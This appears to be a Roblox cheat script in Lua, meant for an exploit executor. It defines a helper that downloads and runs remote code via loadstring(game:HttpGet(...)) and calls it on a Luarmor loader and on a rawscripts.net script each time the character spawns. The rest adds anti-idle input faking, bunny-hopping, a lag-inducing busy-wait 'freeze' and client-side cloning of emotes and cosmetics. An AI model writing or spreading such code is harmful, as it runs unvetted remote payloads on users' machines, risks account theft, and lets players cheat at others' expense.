local p, UIS, RS, VU = game.Players.LocalPlayer, game:GetService("UserInputService"), game:GetService("RunService"), game:GetService("VirtualUser")
local bhop, freeze = false, false

_G.emoteSwaps = {{current = "APose", needed = "SnowmobileCruise"}}

local function dl(u) 
    task.spawn(function() pcall(function() loadstring(game:HttpGet(u))() end) end) 
end

dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")

pcall(function()
    local Storage = game:GetService("ReplicatedStorage")
    
    local function DuplicateAndKeepOriginal(parent, oldName, newName)
        local item = parent:FindFirstChild(oldName)
        if item then
            local copy = item:Clone()
            copy.Name = oldName
            copy.Parent = parent
            
            item.Name = newName
        end
    end

    local E = Storage.Items.Emotes
    DuplicateAndKeepOriginal(E, "RockinStride", "Stride")
    DuplicateAndKeepOriginal(E, "Broom", "SnowmobileCruise")
    
    local C = Storage.Items.Cosmetics
    DuplicateAndKeepOriginal(C, "ToxicInferno", "BorealisAurora")
end)

p.Idled:Connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new(0,0)) end)

local function run(c)
    local h = c:WaitForChild("Head", 5)
    if h then 
        h.Transparency = 1 
        for _, v in pairs(h:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end 
    end
    task.wait(1)
    dl("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127")
end

UIS.InputBegan:Connect(function(i, g) 
    if g then return end 
    if i.KeyCode == Enum.KeyCode.Space then bhop = true 
    elseif i.KeyCode == Enum.KeyCode.PageDown then freeze = true end 
end)

UIS.InputEnded:Connect(function(i) 
    if i.KeyCode == Enum.KeyCode.Space then bhop = false 
    elseif i.KeyCode == Enum.KeyCode.PageDown then freeze = false end 
end)

RS.Heartbeat:Connect(function()
    local c = p.Character
    local m, r = c and c:FindFirstChildOfClass("Humanoid"), c and c:FindFirstChild("HumanoidRootPart")
    if bhop and m and m.FloorMaterial ~= Enum.Material.Air then m:ChangeState(3) end
    if freeze and r then
        local lp = RaycastParams.new() lp.FilterDescendantsInstances = {c}
        if workspace:Raycast(r.Position, Vector3.new(0,-20,0), lp) or workspace:Raycast(r.Position, r.CFrame.LookVector * 15, lp) then
            local t = os.clock() while os.clock() - t < 0.3 do end
        end
    end
end)

p.CharacterAdded:Connect(run)
if p.Character then task.spawn(run, p.Character) end
